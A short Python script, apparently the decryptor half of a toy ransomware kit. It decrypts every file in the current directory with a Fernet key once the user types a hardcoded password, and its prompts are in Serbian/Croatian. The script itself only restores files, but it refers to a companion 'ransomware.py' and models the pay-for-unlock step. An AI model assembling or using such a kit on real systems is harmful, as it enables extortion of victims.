import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
    if os.path.isfile(file):
            files.append(file)
        
print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretpassword = "sifra123"

user_phrase = input("Unesite ispravnu lozinku kako bi dekriptovani vase fajlove\n")

if user_phrase == secretpassword:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("Fajlovi su dekriptovani!")

else:
        print("Pogresna lozinka")


    